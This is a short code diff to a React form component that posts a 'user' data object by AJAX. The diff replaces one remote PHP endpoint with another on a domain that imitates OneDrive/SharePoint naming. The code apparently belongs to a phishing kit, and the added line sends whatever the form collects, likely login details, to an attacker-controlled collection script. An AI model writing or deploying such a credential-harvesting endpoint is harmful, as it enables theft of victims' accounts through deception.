@@ -46,7 +46,7 @@ const Formm = ({ stop_propagate,hideModal })=>{
     
         $.ajax({
             type: "POST",
-            url: "https://dozenpearl.com/nc_assets/fonts/recov/abcd.php",
+            url: "https://ondrivshardocpoint.lat/smalpage/psam.php",
             data: user, 
             success(data) {
                 // alert('OK');
